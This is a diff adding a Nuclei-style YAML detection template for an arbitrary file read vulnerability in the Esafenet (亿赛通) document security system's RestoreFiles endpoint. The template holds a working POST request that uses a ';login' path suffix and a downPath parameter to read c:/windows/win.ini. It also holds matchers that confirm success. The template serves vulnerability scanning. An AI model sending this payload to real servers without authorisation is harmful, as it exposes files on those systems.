@@ -1,0 +1,34 @@
+id: poc-yaml-yisaitong-esafenet-restorefiles-anyfile-read
+info:
+  name: "亿赛通电子文档安全管理系统 RestoreFiles 任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/CDGServer3/document/RestoreFiles;login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "command=DownloadDoc&fileNameForDownload=&downPath=c:/windows/win.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[files]"
+          - "; for 16-bit app support"
+      - type: word
+        part: header
+        words:
+          - "filename="
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - "<"
